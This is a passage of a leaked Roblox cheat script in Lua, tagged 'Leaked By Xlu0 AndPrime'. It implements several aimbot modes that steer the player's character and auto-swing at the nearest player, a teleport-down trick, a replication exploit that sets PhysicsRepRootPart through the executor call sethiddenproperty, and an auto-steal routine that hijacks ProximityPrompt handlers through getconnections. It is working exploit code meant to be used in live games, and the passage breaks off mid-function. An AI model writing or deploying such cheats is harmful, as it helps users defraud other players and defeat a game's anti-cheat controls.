        return S.linearVelocity
    end

    if S.linearVelocity then
        pcall(function() S.linearVelocity:Destroy() end)
    end
    if S.attachment then
        pcall(function() S.attachment:Destroy() end)
    end

    local att = Instance.new("Attachment")
    att.Name = "SoundAimbotAttachment"
    att.Parent = root

    local lv = Instance.new("LinearVelocity")
    lv.Name = "SoundAimbotLinearVelocity"
    lv.Attachment0 = att
    lv.RelativeTo = Enum.ActuatorRelativeTo.World
    lv.ForceLimitMode = Enum.ForceLimitMode.Magnitude
    lv.MaxForce = math.huge
    lv.VectorVelocity = Vector3.zero
    lv.Enabled = true
    lv.Parent = att

    S.attachment = att
    S.linearVelocity = lv
    return lv
end

local function _SoundAimbotReleaseLinearVelocity()
    local S = _G.SoundNormalAimbot
    if S.linearVelocity and S.linearVelocity.Parent then
        S.linearVelocity.VectorVelocity = Vector3.zero
        S.linearVelocity.Enabled = false
    end
end

function _G.SoundStartNormalAimbot()
    if _G.SoundSafeModeTryStart and not _G.SoundSafeModeTryStart() then
        return false
    end

    -- Auto matikan AutoLeft/AutoRight saat aimbot aktif
    if autoLeftEnabled then
        autoLeftEnabled = false
        if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
        if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
    end
    if autoRightEnabled then
        autoRightEnabled = false
        if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
        if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
    end

    if _G.SoundStopAntiBypassAimbot then
        _G.SoundStopAntiBypassAimbot(false)
    end
    _G.SoundAntiBypassAimbotOn = false

    if _G.SoundNormalAimbot.conn then
        pcall(function() _G.SoundNormalAimbot.conn:Disconnect() end)
        _G.SoundNormalAimbot.conn = nil
    end

    _G.SoundNormalAimbotAutoTPWasEnabled = false
    if autoTPEnabled then
        _G.SoundNormalAimbotAutoTPWasEnabled = true
        stopAutoTP()
        if setAutoTPVisual then setAutoTPVisual(false) end
    end

    _G.SoundNormalAimbotOn = true
    _G.SoundNormalAimbot.target = nil

    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end

    -- Bubble aimbot logic (dari aimbot_.txt): prediksi velocity + ping, rotasi via AngularVelocity,
    -- swing otomatis saat dekat, gerak mendekat via AssemblyLinearVelocity.
    -- Semua state/helper dibuat lokal di dalam fungsi ini (hindari batas 200 local di chunk utama).
    local BCfg = {
        ACTIVATE_DISTANCE = 11,
        MIN_FOLLOW_DISTANCE = 1,
        PREDICTION_TIME = 0.22,
        PREDICT_AHEAD = 3,
        MAX_VELOCITY_CHANGE = 150,
        VELOCITY_SMOOTHING = 0.2,
        MAX_HORIZONTAL_VELOCITY = 80,
        SERVER_TICKRATE = 1 / 60,
        ACCELERATION_PREDICTION_WEIGHT = 0.3,
        DIRECTION_CHANGE_DETECTION_TIME = 0.12,
        QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
        GRAVITY = 196.2,
        AIR_CONTROL_FACTOR = 0.8,
        MIN_AIRBORNE_TIME = 0.08,
    }
    local BState = {
        lastTargetPos = nil,
        targetVelocity = Vector3.zero,
        smoothedVelocity = Vector3.zero,
        accelerationHistory = {},
        aerialVelocityHistory = {},
        previousDirection = nil,
        lastDirectionChangeTime = 0,
        airborneTime = 0,
        lastActivationTime = 0,
        currentPing = 0.1,
        lastTarget = nil,
    }
    local function bPush(buf, val, max)
        table.insert(buf, val)
        if #buf > max then table.remove(buf, 1) end
    end
    local function bAvg(list)
        if #list == 0 then return Vector3.zero end
        local sum = Vector3.zero
        for _, v in ipairs(list) do sum = sum + v end
        return sum / #list
    end
    local function bReset()
        BState.lastTargetPos = nil
        BState.targetVelocity = Vector3.zero
        BState.smoothedVelocity = Vector3.zero
        BState.accelerationHistory = {}
        BState.aerialVelocityHistory = {}
        BState.previousDirection = nil
        BState.airborneTime = 0
    end
    local function bRotateToward(root, dir)
        if dir.Magnitude < 0.01 then return end
        local cross = root.CFrame.LookVector:Cross(dir.Unit)
        local angle = math.asin(math.clamp(cross.Magnitude, -1, 1))
        root.AssemblyAngularVelocity = cross.Magnitude > 0.01
            and cross.Unit * angle * 80
            or Vector3.zero
    end

    _G.SoundNormalAimbot.conn = RunService.RenderStepped:Connect(function(dt)
        if not _G.SoundNormalAimbotOn or selectedAimbotMode ~= "Normal" then
            return
        end

        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not char or not hum or not root or hum.Health <= 0 then
            return
        end

        hum.AutoRotate = false

        -- equip bat kalau belum pegang tool
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then
            local bat = _G.SoundFindAimbotBat()
            if bat then
                pcall(function() hum:EquipTool(bat) end)
                tool = bat
            end
        end

        -- target terdekat
        local target = _G.SoundGetClosestAimbotTarget()
        local tHum = target and target.Parent and target.Parent:FindFirstChildOfClass("Humanoid")
        if not target or not tHum or tHum.Health <= 0 then
            _G.SoundNormalAimbot.target = nil
            bReset()
            BState.lastTarget = nil
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
            return
        end
        _G.SoundNormalAimbot.target = target

        -- ganti target -> reset tracking supaya velocity tidak loncat
        if BState.lastTarget ~= target then
            bReset()
            BState.lastTarget = target
        end

        local pos, delta = target.Position, math.max(dt, 1 / 240)

        -- tracking velocity
        if BState.lastTargetPos then
            local rawVel = (pos - BState.lastTargetPos) / delta
            local diff = rawVel - BState.targetVelocity
            if diff.Magnitude > BCfg.MAX_VELOCITY_CHANGE then
                rawVel = BState.targetVelocity + diff.Unit * BCfg.MAX_VELOCITY_CHANGE
            end

            local horiz = Vector3.new(rawVel.X, 0, rawVel.Z)
            if horiz.Magnitude > BCfg.MAX_HORIZONTAL_VELOCITY then
                horiz = horiz.Unit * BCfg.MAX_HORIZONTAL_VELOCITY
                rawVel = Vector3.new(horiz.X, rawVel.Y, horiz.Z)
            end

            bPush(BState.accelerationHistory, (rawVel - BState.targetVelocity) / delta, 4)
            BState.targetVelocity = rawVel
            BState.smoothedVelocity = BState.smoothedVelocity:Lerp(rawVel, BCfg.VELOCITY_SMOOTHING)
        end
        BState.lastTargetPos = pos

        -- deteksi di udara
        local isAir = tHum.FloorMaterial == Enum.Material.Air
        BState.airborneTime = isAir and (BState.airborneTime + delta) or 0
        if isAir and BState.airborneTime >= BCfg.MIN_AIRBORNE_TIME then
            bPush(BState.aerialVelocityHistory, BState.targetVelocity, 6)
        elseif not isAir then
            BState.aerialVelocityHistory = {}
        end

        local vel = BState.smoothedVelocity
        if isAir and #BState.aerialVelocityHistory > 0 then
            local aerial = bAvg(BState.aerialVelocityHistory)
            vel = Vector3.new(aerial.X, BState.targetVelocity.Y, aerial.Z) * BCfg.AIR_CONTROL_FACTOR
        end

        -- deteksi ganti arah cepat
        local quickTurn = false
        local horiz2 = Vector3.new(BState.targetVelocity.X, 0, BState.targetVelocity.Z)
        if horiz2.Magnitude > 5 then
            local dir = horiz2.Unit
            if BState.previousDirection and BState.previousDirection:Dot(dir) < 0.5 then
                quickTurn = tick() - BState.lastDirectionChangeTime < BCfg.DIRECTION_CHANGE_DETECTION_TIME
                BState.lastDirectionChangeTime = tick()
            end
            BState.previousDirection = dir
        end

        -- prediksi posisi
        local ping = BState.currentPing + BCfg.SERVER_TICKRATE
        local predTime = BCfg.PREDICTION_TIME * 1.1
        local mult = quickTurn and BCfg.QUICK_DIRECTION_CHANGE_MULTIPLIER or 1

        local predicted = pos + vel * (ping * mult)
            + bAvg(BState.accelerationHistory) * BCfg.ACCELERATION_PREDICTION_WEIGHT
            * ((ping * mult) * (ping * mult) * 0.5)

        if isAir then
            predicted = predicted + vel * predTime
                + Vector3.new(0, -0.5 * BCfg.GRAVITY * predTime * predTime, 0)
        else
            predicted = predicted + vel * predTime
        end

        local horizVel = Vector3.new(vel.X, 0, vel.Z)
        local aimPoint = (horizVel.Magnitude > 1
            and predicted + horizVel.Unit * BCfg.PREDICT_AHEAD
            or predicted) - root.Position

        bRotateToward(root, aimPoint)

        -- swing otomatis saat dekat
        if (pos - root.Position).Magnitude <= BCfg.ACTIVATE_DISTANCE
            and tick() - BState.lastActivationTime >= 0.3 then
            if tool then pcall(function() tool:Activate() end) end
            BState.lastActivationTime = tick()
        end

        -- fitur Auto Swing yang sudah ada tetap jalan
        if autoSwingEnabled then
            local bat = char:FindFirstChildOfClass("Tool") or _G.SoundFindAimbotBat()
            if bat and bat:IsA("Tool") then
                pcall(function() bat:Activate() end)
            end
        end

        -- gerak mendekat (kecepatan ikut speed box / mode Lagger)
        if aimPoint.Magnitude > BCfg.MIN_FOLLOW_DISTANCE then
            local spd = math.clamp(_G.SoundGetNormalAimbotSpeed(), 1, 120)
            root.AssemblyLinearVelocity = aimPoint.Unit * spd
        else
            root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y * 0.5, 0)
        end
    end)

    if _G.SoundRefreshAimbotVisual then
        _G.SoundRefreshAimbotVisual()
    end

    return true
end

function _G.SoundStopNormalAimbot()
    _G.SoundNormalAimbotOn = false

    if _G.SoundNormalAimbot and _G.SoundNormalAimbot.conn then
        pcall(function() _G.SoundNormalAimbot.conn:Disconnect() end)
        _G.SoundNormalAimbot.conn = nil
    end

    if _G.SoundNormalAimbot then
        _G.SoundNormalAimbot.target = nil
    end

    _SoundAimbotReleaseLinearVelocity()

    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    if root then
        root.AssemblyLinearVelocity  = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end

    if hum then
        hum.AutoRotate = true
    end

    if _G.SoundNormalAimbotAutoTPWasEnabled then
        _G.SoundNormalAimbotAutoTPWasEnabled = false
        autoTPEnabled = true
        if setAutoTPVisual then setAutoTPVisual(true) end
        startAutoTP()
    end

    if _G.SoundRefreshAimbotVisual then
        _G.SoundRefreshAimbotVisual()
    end
end
_G.SoundAntiBypassAimbot = _G.SoundAntiBypassAimbot or {conn = nil, swingCooldown = false, prevAutoRotate = nil}
_G.SoundAntiBypassSettings = {
SPEED = 63,
VERT_SPEED = 52,
DISTANCE = -2.8,
HEIGHT = 4.75,
V_OFFSET = 1,
TURN_SPEED = 285,
MAX_TURN_RATE = 28,
AUTO_SWING = true,
-- Bat V2 (dari BlueX)
V2_FOLLOW_DIST = 1.0,
V2_HEIGHT_OFFSET = 1.5,
V2_VERTICAL_OFFSET = 0.0,
V2_CHASE_SPD = 60,
V2_SWING_CD = 0.08,
V2_HIT_DIST = 4.5,
}
_G.SoundAntiBypassSlapList = _G.SoundAntiBypassSlapList or {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
function _G.SoundAntiBypassFindBat()
local char = LP.Character
if not char then return nil end
for _, tool in ipairs(char:GetChildren()) do
if tool:IsA("Tool") then
local name = tool.Name:lower()
if name:find("bat") or name:find("slap") then return tool end
end
end
local bp = LP:FindFirstChildOfClass("Backpack")
if bp then
for _, tool in ipairs(bp:GetChildren()) do
if tool:IsA("Tool") then
local name = tool.Name:lower()
if name:find("bat") or name:find("slap") then return tool end
end
end
end
return nil
end
function _G.SoundAntiBypassEnsureBat()
local char = LP.Character
local hum = char and char:FindFirstChildOfClass("Humanoid")
if not char or not hum then return nil end
local equipped = char:FindFirstChildOfClass("Tool")
if equipped then return equipped end
local bat = _G.SoundAntiBypassFindBat()
if bat then pcall(function() hum:EquipTool(bat) end) end
return bat
end
function _G.SoundAntiBypassTrySwing()
if _G.SoundAntiBypassAimbot.swingCooldown then return end
_G.SoundAntiBypassAimbot.swingCooldown = true
local S = _G.SoundAntiBypassSettings
pcall(function()
local char = LP.Character
local hum = char and char:FindFirstChildOfClass("Humanoid")
local tool = _G.SoundAntiBypassFindBat()
if tool and char then
if tool.Parent ~= char and hum then pcall(function() hum:EquipTool(tool) end) end
local remote = tool:FindFirstChildOfClass("RemoteEvent")
if remote then pcall(function() remote:FireServer() end)
else pcall(function() tool:Activate() end) end
end
end)
task.delay(S.V2_SWING_CD, function()
if _G.SoundAntiBypassAimbot then _G.SoundAntiBypassAimbot.swingCooldown = false end
end)
end
function _G.SoundAntiBypassGetClosest()
local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
if not root then return nil, math.huge end
local closest, minDist = nil, math.huge
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
local hum = plr.Character:FindFirstChildOfClass("Humanoid")
if tRoot and hum and hum.Health > 0 then
local dist = (tRoot.Position - root.Position).Magnitude
if dist < minDist then minDist, closest = dist, tRoot end
end
end
end
return closest, minDist
end
function _G.SoundStartAntiBypassAimbot()
if _G.SoundSafeModeTryStart and not _G.SoundSafeModeTryStart() then return false end
-- Auto matikan AutoLeft/AutoRight saat aimbot aktif
if autoLeftEnabled then
    autoLeftEnabled = false
    if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
    if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
end
if autoRightEnabled then
    autoRightEnabled = false
    if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
    if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
end
if _G.SoundStopAutoTPForAction then _G.SoundStopAutoTPForAction() end
if _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot() end
_G.SoundAntiBypassAimbotOn = true
selectedAimbotMode = "Anti Bypass"
if _G.SoundAntiBypassAimbot.conn then _G.SoundAntiBypassAimbot.conn:Disconnect() end
local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
if hum0 then
_G.SoundAntiBypassAimbot.prevAutoRotate = hum0.AutoRotate
end
_G.SoundAntiBypassAimbot.conn = RunService.Heartbeat:Connect(function()
if not _G.SoundAntiBypassAimbotOn or selectedAimbotMode ~= "Anti Bypass" then return end
local char = LP.Character
local hum = char and char:FindFirstChildOfClass("Humanoid")
local root = char and char:FindFirstChild("HumanoidRootPart")
if not char or not hum or not root or hum.Health <= 0 then return end
local S = _G.SoundAntiBypassSettings
local targetRoot = _G.SoundAntiBypassGetClosest()
if targetRoot then
local targetVel = targetRoot.Velocity
local moveDir = targetVel.Magnitude > 0.1 and targetVel.Unit or targetRoot.CFrame.LookVector
local offset = moveDir * S.V2_FOLLOW_DIST + Vector3.new(0, S.V2_HEIGHT_OFFSET + S.V2_VERTICAL_OFFSET, 0)
local desiredPos = targetRoot.Position + offset
local toTarget = desiredPos - root.Position
if toTarget.Magnitude > 0.5 then
local moveVec = toTarget.Unit * S.V2_CHASE_SPD
root.Velocity = Vector3.new(moveVec.X, moveVec.Y, moveVec.Z)
else
root.Velocity = root.Velocity * 0.95
if root.Velocity.Magnitude < 1 then root.Velocity = Vector3.zero end
end
local distToTarget = (root.Position - targetRoot.Position).Magnitude
if distToTarget <= S.V2_HIT_DIST then _G.SoundAntiBypassTrySwing() end
else
root.Velocity = root.Velocity * 0.9
if root.Velocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
end
end)
if _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end
return true
end
function _G.SoundStopAntiBypassAimbot(keepVisual)
_G.SoundAntiBypassAimbotOn = false
if _G.SoundAntiBypassAimbot and _G.SoundAntiBypassAimbot.conn then
_G.SoundAntiBypassAimbot.conn:Disconnect()
_G.SoundAntiBypassAimbot.conn = nil
end
if _G.SoundAntiBypassAimbot then _G.SoundAntiBypassAimbot.swingCooldown = false end
local char = LP.Character
local root = char and char:FindFirstChild("HumanoidRootPart")
local hum = char and char:FindFirstChildOfClass("Humanoid")
if root then
root.AssemblyLinearVelocity = Vector3.zero
root.AssemblyAngularVelocity = Vector3.zero
end
if hum then
hum.AutoRotate = (_G.SoundAntiBypassAimbot.prevAutoRotate == nil) and true or _G.SoundAntiBypassAimbot.prevAutoRotate
end
_G.SoundAntiBypassAimbot.prevAutoRotate = nil
if keepVisual ~= false and _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end
end
function _G.SoundToggleSelectedAimbot()
if selectedAimbotMode == "Anti Bypass" then
if _G.SoundAntiBypassAimbotOn then
if _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot() else _G.SoundAntiBypassAimbotOn = false end
else
if _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot() end
if _G.SoundStartAntiBypassAimbot then _G.SoundStartAntiBypassAimbot() else _G.SoundAntiBypassAimbotOn = true end
end
else
if _G.SoundNormalAimbotOn then
_G.SoundStopNormalAimbot()
else
if _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot(false) else _G.SoundAntiBypassAimbotOn = false end
_G.SoundStartNormalAimbot()
end
end
if _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end
if saveSoundConfig then pcall(saveSoundConfig) end
end
function _G.SoundRefreshAimbotVisual()
if _G.SoundAimbotSetVisual then
if selectedAimbotMode == "Anti Bypass" then
_G.SoundAimbotSetVisual(_G.SoundAntiBypassAimbotOn == true)
else
_G.SoundAimbotSetVisual(_G.SoundNormalAimbotOn == true)
end
end
end
_G.SoundNormalAimbotStart = _G.SoundStartNormalAimbot
_G.SoundNormalAimbotStop = _G.SoundStopNormalAimbot
_G.SoundAntiBypassStart = _G.SoundStartAntiBypassAimbot
_G.SoundAntiBypassStop = _G.SoundStopAntiBypassAimbot

local MIRROR_TP_DROP_THRESHOLD = 3
local MIRROR_TP_DOWN_Y = -7.00
local mirrorTPPreviousY = {}
local mirrorTPLastTeleport = 0

local function mirrorTPAimbotActive()
return (_G.SoundNormalAimbotOn == true) or (_G.SoundAntiBypassAimbotOn == true)
end

local function mirrorTPTeleportDown()
local character = LP.Character
local root = character and character:FindFirstChild("HumanoidRootPart")
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not root or not humanoid or humanoid.Health <= 0 then return end

local now = tick()
if now - (mirrorTPLastTeleport or 0) < 0.08 then return end
mirrorTPLastTeleport = now

local _, yaw = root.CFrame:ToEulerAnglesYXZ()
local y = (MIRROR_TP_DOWN_Y or -7) + (math.random() * 0.6 - 0.3)
root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
root.AssemblyLinearVelocity = Vector3.new((math.random() - 0.5) * 0.4, 0, (math.random() - 0.5) * 0.4)
end

RunService.Heartbeat:Connect(function()
if not mirrorTPDownEnabled or not mirrorTPAimbotActive() then
if next(mirrorTPPreviousY) then
table.clear(mirrorTPPreviousY)
end
return
end

for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local root = plr.Character:FindFirstChild("HumanoidRootPart")
if root then
local currentY = root.Position.Y
local previousY = mirrorTPPreviousY[plr.UserId]
if previousY and previousY - currentY >= (MIRROR_TP_DROP_THRESHOLD or 3) then
pcall(mirrorTPTeleportDown)
table.clear(mirrorTPPreviousY)
return
end
mirrorTPPreviousY[plr.UserId] = currentY
end
end
end
end)

function _G.SoundSetMirrorTPDown(enabled)
mirrorTPDownEnabled = enabled == true
if not mirrorTPDownEnabled then
table.clear(mirrorTPPreviousY)
end
if _G.SoundMirrorTPDownSetVisual then
_G.SoundMirrorTPDownSetVisual(mirrorTPDownEnabled)
end
end

_G.SoundAntiDesync = _G.SoundAntiDesync or {
    conn = nil,
    hittingCooldown = false,
    h = nil,
    hrp = nil
}

local XLU0_TP_BAT_NAMES = {
    "Bat","Slap","Iron Slap","Gold Slap","Diamond Slap",
    "Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap",
    "Nuclear Slap","Galaxy Slap","Glitched Slap"
}

function _G.SoundAntiDesyncGetBat()
    local char = LP.Character
    if not char then return nil end

    for _, name in ipairs(XLU0_TP_BAT_NAMES) do
        local tool = char:FindFirstChild(name)
        if tool and tool:IsA("Tool") then
            return tool
        end
    end

    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, name in ipairs(XLU0_TP_BAT_NAMES) do
            local tool = bp:FindFirstChild(name)
            if tool and tool:IsA("Tool") then
                tool.Parent = char
                return tool
            end
        end
    end

    return nil
end

function _G.SoundAntiDesyncTrySwing()
    if _G.SoundAntiDesync.hittingCooldown then return end
    _G.SoundAntiDesync.hittingCooldown = true

    pcall(function()
        local bat = _G.SoundAntiDesyncGetBat()
        if not bat then return end

        bat:Activate()
        local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
        if ev then ev:FireServer() end
    end)

    task.delay(0.08, function()
        if _G.SoundAntiDesync then
            _G.SoundAntiDesync.hittingCooldown = false
        end
    end)
end

function _G.SoundAntiDesyncGetClosestPlayer()
    local hrp = _G.SoundAntiDesync and _G.SoundAntiDesync.hrp
    if not hrp then return nil end

    local closest, bestDist = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            local hum = player.Character:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health > 0 then
                local dist = (hrp.Position - root.Position).Magnitude
                if dist < bestDist then
                    bestDist = dist
                    closest = player
                end
            end
        end
    end

    return closest, bestDist
end

function _G.SoundAntiDesyncSetupChar(char)
    task.wait(0.2)
    if not _G.SoundAntiDesync then return end
    _G.SoundAntiDesync.h = char and char:FindFirstChildOfClass("Humanoid") or nil
    _G.SoundAntiDesync.hrp = char and char:FindFirstChild("HumanoidRootPart") or nil

    if _G.SoundAntiDesyncAimbotOn and not _G.SoundAntiDesync.conn then
        _G.SoundStartAntiDesyncAimbot()
    end
end

LP.CharacterAdded:Connect(function(char)
    pcall(function() _G.SoundAntiDesyncSetupChar(char) end)
end)

if LP.Character then
    task.spawn(function()
        pcall(function() _G.SoundAntiDesyncSetupChar(LP.Character) end)
    end)
end

function _G.SoundStartAntiDesyncAimbot()
    if _G.SoundSafeModeTryStart and not _G.SoundSafeModeTryStart() then
        return false
    end

    if _G.SoundAntiDesync.conn then
        _G.SoundAntiDesync.conn:Disconnect()
        _G.SoundAntiDesync.conn = nil
    end

    _G.SoundAntiDesyncAimbotOn = true

    local char = LP.Character
    if char then
        _G.SoundAntiDesync.h = char:FindFirstChildOfClass("Humanoid")
        _G.SoundAntiDesync.hrp = char:FindFirstChild("HumanoidRootPart")
    end

    _G.SoundAntiDesync.conn = RunService.Heartbeat:Connect(function()
        if not _G.SoundAntiDesyncAimbotOn then return end

        if not _G.SoundAntiDesync.h or not _G.SoundAntiDesync.hrp then
            local currentChar = LP.Character
            if not currentChar then return end
            _G.SoundAntiDesync.h = currentChar:FindFirstChildOfClass("Humanoid")
            _G.SoundAntiDesync.hrp = currentChar:FindFirstChild("HumanoidRootPart")
            if not _G.SoundAntiDesync.h or not _G.SoundAntiDesync.hrp then return end
        end

        local target = _G.SoundAntiDesyncGetClosestPlayer()
        _aimbotTargetPlr = target
        _G.SoundCurrentAimbotTarget = target
        _G.SoundAntiDesyncBatTarget = target

        if not target or not target.Character then return end

        local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetRoot then return end

        --Leaked By Xlu0 AndPrime--
        if sethiddenproperty then
            pcall(sethiddenproperty, _G.SoundAntiDesync.hrp, "PhysicsRepRootPart", targetRoot)
        end

        --Leaked By Xlu0 AndPrime--
        local targetPos = targetRoot.Position + Vector3.new(0, 0.9, 0)
        if (_G.SoundAntiDesync.hrp.Position - targetPos).Magnitude > 8 then
            _G.SoundAntiDesync.hrp.CFrame = CFrame.new(targetPos)
        end

        --Leaked By Xlu0 AndPrime--
        local cam = workspace.CurrentCamera
        if cam then
            cam.CFrame = CFrame.new(cam.CFrame.Position, targetRoot.Position)
        end

        --Leaked By Xlu0 AndPrime--
        _G.SoundAntiDesyncTrySwing()
    end)

    if _G.SoundAntiDesyncSetVisual then
        _G.SoundAntiDesyncSetVisual(true)
    end

    return true
end

function _G.SoundStopAntiDesyncAimbot()
    _G.SoundAntiDesyncAimbotOn = false

    if _G.SoundAntiDesync and _G.SoundAntiDesync.conn then
        _G.SoundAntiDesync.conn:Disconnect()
        _G.SoundAntiDesync.conn = nil
    end

    if _G.SoundAntiDesync then
        _G.SoundAntiDesync.hittingCooldown = false
    end

    _G.SoundAntiDesyncBatTarget = nil
    if _G.SoundCurrentAimbotTarget == _aimbotTargetPlr then
        _G.SoundCurrentAimbotTarget = nil
    end
    _aimbotTargetPlr = nil

    if _G.SoundAntiDesyncSetVisual then
        _G.SoundAntiDesyncSetVisual(false)
    end
end

function _G.SoundToggleAntiDesyncAimbot()
    if _G.SoundAntiDesyncAimbotOn then
        _G.SoundStopAntiDesyncAimbot()
    else
        _G.SoundStartAntiDesyncAimbot()
    end
end

_G.__SoundSetupNormalAutoSteal = function()
local getconnections_v3 = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
_G.SoundGalaxyV3 = _G.SoundGalaxyV3 or {
conn=nil, active=false, progress=0, paused=false, pauseTime=nil,
startTime=nil, progressConn=nil, dataCache={}, enabled=false,
StealRadius=63, StealDuration=1.3, TriggerRadius=10
}
local GS = _G.SoundGalaxyV3

local function getHRP()
local c=LP.Character
return c and c:FindFirstChild("HumanoidRootPart")
end

local function isMyPlot(plotName)
local plots=workspace:FindFirstChild("Plots")
if not plots then return false end
local plot=plots:FindFirstChild(plotName)
if not plot then return false end
local sign=plot:FindFirstChild("PlotSign")
if sign then
local yb=sign:FindFirstChild("YourBase")
if yb and yb:IsA("BillboardGui") then return yb.Enabled==true end
end
return false
end

local function findPrompt()
local hrp=getHRP()
if not hrp then return nil,nil end
local plots=workspace:FindFirstChild("Plots")
if not plots then return nil,nil end
local bestPrompt,bestDist,bestSpawn=nil,math.huge,nil

for _,plot in ipairs(plots:GetChildren()) do
if not plot:IsA("Model") then continue end
if isMyPlot(plot.Name) then continue end
local pods=plot:FindFirstChild("AnimalPodiums")
if not pods then continue end

for _,pod in ipairs(pods:GetChildren()) do
pcall(function()
local base=pod:FindFirstChild("Base")
local spawn=base and base:FindFirstChild("Spawn")
if not spawn then return end
local dist=(spawn.Position-hrp.Position).Magnitude
if dist>=bestDist or dist>GS.StealRadius then return end

local function tryPrompt(container)
for _,ch in ipairs(container:GetChildren()) do
if ch:IsA("ProximityPrompt") and ch.Enabled then
bestPrompt=ch
bestDist=dist
bestSpawn=spawn
return true
end
end
end

local att=spawn:FindFirstChild("PromptAttachment")
if not (att and tryPrompt(att)) then
for _,ch in ipairs(spawn:GetDescendants()) do
if ch:IsA("ProximityPrompt") and ch.Enabled then
bestPrompt=ch
bestDist=dist
bestSpawn=spawn
break
end
end
end
end)
end
end
return bestPrompt,bestSpawn
end

local function distToSpawn(spawnPart)
local hrp=getHRP()
if not hrp then return math.huge end
if not spawnPart or not spawnPart.Parent then
local _,ns=findPrompt()
return ns and (hrp.Position-ns.Position).Magnitude or math.huge
end
return (hrp.Position-spawnPart.Position).Magnitude
end

local function updateBar(p,state)
if _G.StealBar then
pcall(function()
_G.StealBar.SetProgress(p or 0)
if state then _G.StealBar.SetState(state) end
end)
end
end

local function execute(prompt,spawnPart)
if GS.active then return end

if not GS.dataCache[prompt] then
local data={hold={},trigger={},ready=true}
if getconnections_v3 then
pcall(function()
for _,c in ipairs(getconnections_v3(prompt.PromptButtonHoldBegan)) do
if c.Function then table.insert(data.hold,c.Function) end
end
for _,c in ipairs(getconnections_v3(prompt.Triggered)) do
if c.Function then table.insert(data.trigger,c.Function) end
end
end)
end
GS.dataCache[prompt]=data
end

local data=GS.dataCache[prompt]
if not data.ready then return end

data.ready=false
GS.active=true
GS.paused=false
GS.startTime=tick()-(GS.progress*GS.StealDuration)
local pauseArmed=true
local PAUSE_AT=0.75
local PAUSE_WAIT=3.0
local PAUSE_RELEASE_BEFORE=0.3

if GS.progressConn then GS.progressConn:Disconnect() end
updateBar(GS.progress,"STEALING")

local function isLocalRagdolled()
local c=LP.Character
if not c then return false end
local hum=c:FindFirstChildOfClass("Humanoid")
if not hum then return false end
if _G.SoundCounterIsRagdoll then return _G.SoundCounterIsRagdoll(hum) end
local st=hum:GetState()
return st==Enum.HumanoidStateType.Physics
or st==Enum.HumanoidStateType.Ragdoll
or st==Enum.HumanoidStateType.FallingDown
or hum.PlatformStand==true
end

GS.progressConn=RunService.Heartbeat:Connect(function()
if not GS.active then
if GS.progressConn then GS.progressConn:Disconnect();GS.progressConn=nil end
return
end

if not GS.enabled or not autoStealEnabled or selectedStealMode~="Auto Steal V3" then
GS.active=false
GS.progress=0
GS.paused=false
data.ready=true
updateBar(0,autoStealEnabled and "READY" or "IDLE")
return
end

if GS.paused then
local dist=distToSpawn(spawnPart)
local waited=tick()-(GS.pauseTime or tick())
if dist<=GS.TriggerRadius then
GS.paused=false
GS.pauseTime=nil
GS.startTime=tick()-(PAUSE_AT*GS.StealDuration)
else
if not GS.pauseTime then
GS.pauseTime=tick()
elseif waited>=PAUSE_WAIT then
GS.pauseTime=nil
GS.paused=false
GS.active=false
GS.progress=0
data.ready=true
pauseArmed=true
if GS.progressConn then GS.progressConn:Disconnect();GS.progressConn=nil end
updateBar(0,autoStealEnabled and "READY" or "IDLE")
return
end
GS.progress=PAUSE_AT
updateBar(PAUSE_AT,"STEALING")
if PAUSE_WAIT-waited<=PAUSE_RELEASE_BEFORE then
GS.paused=false
GS.pauseTime=nil
GS.startTime=tick()-(PAUSE_AT*GS.StealDuration)
end
return
end
end

local elapsed=tick()-GS.startTime
local prog=math.clamp(elapsed/GS.StealDuration,0,1)
GS.progress=prog

if pauseArmed and prog>=PAUSE_AT then
